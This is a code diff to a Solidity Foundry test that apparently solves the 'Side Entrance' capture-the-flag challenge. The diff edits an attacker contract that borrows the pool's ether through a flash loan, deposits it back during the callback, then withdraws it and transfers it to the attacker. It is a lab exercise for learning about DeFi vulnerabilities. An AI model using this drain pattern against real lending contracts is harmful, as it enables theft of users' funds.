@@ -41,7 +41,6 @@ contract SideEntrance is Test {
         vm.startPrank(attacker);
         FakeReceiver attackerContract = new FakeReceiver(sideEntranceLenderPool);
         attackerContract.flashLoan(ETHER_IN_POOL);
-        attackerContract.withdraw();
         vm.stopPrank();
         /**
          * EXPLOIT END *
@@ -71,16 +70,13 @@ contract FakeReceiver {
 
     function flashLoan(uint256 amount) external {
         pool.flashLoan(amount);
+        pool.withdraw();
+        (bool ok,) = payable(owner).call{value: address(this).balance}("");
+        require(ok, "Withdraw failed");
     }
 
     function execute() external payable {
         pool.deposit{value: msg.value}();
-    }
-
-    function withdraw() external {
-        pool.withdraw();
-        (bool ok,) = payable(owner).call{value: address(this).balance}("");
-        require(ok, "Withdraw failed");
     }
 
     receive() external payable {}
